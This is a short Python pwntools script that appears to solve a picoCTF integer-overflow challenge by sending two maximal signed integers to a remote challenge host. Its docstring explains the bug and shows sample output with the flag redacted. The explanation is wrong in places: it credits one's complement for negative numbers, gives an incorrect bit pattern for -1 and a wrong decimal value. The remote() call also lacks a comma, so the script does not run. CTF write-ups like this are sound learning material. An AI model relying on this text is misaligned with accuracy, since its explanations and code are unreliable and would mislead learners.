#!/bin/python3

"""
simple integer overflow vulnerability from how negative numbers are calculated, an integer is 4 bytes so, 
0 is 0000 0000 0000 0000 0000 0000 0000 0000 
1 is 0000 0000 0000 0000 0000 0000 0000 0001

but when it comes to negative numbers we use something called one's complement to calculate them so,
-1 looks something like 1111 1111 1111 1111 1111 1111 1111 1110, on calculating the one's complement of this we get
0000 0000 0000 0000 0000 0000 0000 0001 which is 1, 

since a signed integer is limited to 32 bits or 4 bytes, we can abuse this to get an integer overflow. If we calculate the decimal 
equivalent of -1 we get 4294967294. Now, to get an integer overflow we can pass 2 integers whose sum is greater than or equal to this 
and the result will be negative.

n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
2147483647 2147483647
You entered 2147483647 and 2147483647
You have an integer overflow
YOUR FLAG IS: -----------------REDACTED-----------------

The two numbers above while indivisualy positive, when their sum is calculated it is found to be negative due to integer overflow.
"""

from pwn import *

elf = context.binary = ELF("./flag")
# p = elf.process()
p = remote("saturn.picoctf.net" 52767)

p.sendlineafter(b":", b"2147483647 2147483647")
print(p.recvall().decode("latin-1"))
